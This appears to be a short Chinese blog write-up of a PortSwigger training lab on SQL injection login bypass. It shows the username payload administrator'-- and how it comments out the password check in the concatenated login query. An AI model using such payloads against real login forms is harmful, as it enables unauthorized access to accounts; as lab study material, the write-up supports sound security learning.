---
title: "SQL injection（Lab2)"
published: 2026-10-13
description: "PortSwigger SQLi 入门：登录绕过 Lab：SQL injection vulnerability allowing …"
category: "靶场"
---

# PortSwigger SQLi 入门：登录绕过

> Lab：[SQL injection vulnerability allowing login bypass](https://portswigger.net/web-security/sql-injection/lab-login-bypass)

## 题目在考什么

登录接口把用户名直接拼进 SQL。目标是不依赖正确密码，以 `administrator` 身份登录。

后端查询大致形如：

```sql
SELECT * FROM users WHERE username = '...' AND password = '...'
```

## 注入点

登录页的 **username** 字段（可用 Burp 抓包确认）。

## 做法

用户名填：

```text
administrator'--
```

密码随便填。效果是把查询变成类似：

```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = '666'
```

`--` 注释掉后面的密码校验，只要存在 `administrator` 这个用户就能登进去。

![](https://pic.npiter.de/file/1791902911651_20261013224828064.png)
